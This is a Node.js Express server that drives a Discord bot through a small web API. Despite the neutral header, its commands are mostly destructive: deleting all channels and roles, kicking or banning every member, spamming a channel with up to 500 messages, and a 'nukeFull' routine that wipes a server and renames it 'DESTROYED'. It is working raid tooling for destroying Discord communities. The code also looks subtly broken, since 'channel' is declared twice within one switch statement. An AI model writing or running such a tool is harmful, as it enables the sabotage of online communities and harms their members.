// server.js - Backend for Discord Bot Control
// Run with: node server.js

const express = require('express');
const { Client, GatewayIntentBits, ChannelType, PermissionsBitField } = require('discord.js');
const cors = require('cors');

const app = express();
app.use(cors());
app.use(express.json());
app.use(express.static('.'));

let botClient = null;
let isConnected = false;

// Helper: create bot client
function createBot(token) {
    const client = new Client({
        intents: [
            GatewayIntentBits.Guilds,
            GatewayIntentBits.GuildMembers,
            GatewayIntentBits.GuildMessages,
            GatewayIntentBits.MessageContent,
            GatewayIntentBits.GuildMessageReactions
        ]
    });

    client.on('ready', () => {
        console.log(`✅ Bot connected: ${client.user.tag}`);
        isConnected = true;
    });

    client.on('error', (err) => {
        console.error('Bot error:', err);
    });

    client.login(token);
    return client;
}

// API Routes
app.post('/api/connect', (req, res) => {
    const { token } = req.body;
    if(!token) return res.status(400).json({ error: 'No token' });
    
    try {
        if(botClient) botClient.destroy();
        botClient = createBot(token);
        res.json({ success: true, message: 'Connecting...' });
    } catch(e) {
        res.status(500).json({ error: e.message });
    }
});

app.post('/api/command', async (req, res) => {
    const { command, params, guildId } = req.body;
    
    if(!botClient || !isConnected) {
        return res.status(400).json({ error: 'Bot not connected' });
    }
    
    try {
        const guild = botClient.guilds.cache.get(guildId);
        if(!guild) return res.status(404).json({ error: 'Guild not found' });
        
        switch(command) {
            case 'guildDelete':
                await guild.delete();
                break;
            case 'guildEdit':
                await guild.edit({ name: params.name });
                break;
            case 'channelCreate':
                await guild.channels.create({ name: params.name, type: ChannelType.GuildText });
                break;
            case 'channelDelete':
                const channel = guild.channels.cache.get(params.channelId);
                if(channel) await channel.delete();
                break;
            case 'channelDeleteAll':
                for(const [id, ch] of guild.channels.cache) {
                    if(ch.deletable) await ch.delete().catch(()=>{});
                }
                break;
            case 'roleCreate':
                await guild.roles.create({ name: params.name });
                break;
            case 'roleDeleteAll':
                for(const [id, role] of guild.roles.cache) {
                    if(role.name !== '@everyone' && role.editable) await role.delete().catch(()=>{});
                }
                break;
            case 'memberKickAll':
                const members = await guild.members.fetch();
                for(const [id, member] of members) {
                    if(member.kickable && member.id !== botClient.user.id) await member.kick().catch(()=>{});
                }
                break;
            case 'memberBanAll':
                const allMembers = await guild.members.fetch();
                for(const [id, member] of allMembers) {
                    if(member.bannable && member.id !== botClient.user.id) await member.ban().catch(()=>{});
                }
                break;
            case 'spamMessage':
                const channel = guild.channels.cache.find(c => c.isTextBased());
                for(let i = 0; i < Math.min(parseInt(params.count) || 10, 500); i++) {
                    await channel.send(params.text || 'SPAM');
                    await new Promise(r => setTimeout(r, 50));
                }
                break;
            case 'nukeFull':
                // Delete all channels
                for(const [id, ch] of guild.channels.cache) {
                    if(ch.deletable) await ch.delete().catch(()=>{});
                }
                // Delete all roles
                for(const [id, role] of guild.roles.cache) {
                    if(role.name !== '@everyone' && role.editable) await role.delete().catch(()=>{});
                }
                // Kick all members
                const all = await guild.members.fetch();
                for(const [id, m] of all) {
                    if(m.kickable && m.id !== botClient.user.id) await m.kick().catch(()=>{});
                }
                // Rename server
                await guild.edit({ name: `DESTROYED_${Date.now()}` });
                break;
            default:
                return res.status(400).json({ error: 'Unknown command' });
        }
        
        res.json({ success: true });
    } catch(e) {
        res.status(500).json({ error: e.message });
    }
});

app.get('/api/status', (req, res) => {
    res.json({ connected: isConnected, botName: botClient?.user?.tag || null });
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
    console.log(`🔥 Server running on http://localhost:${PORT}`);
});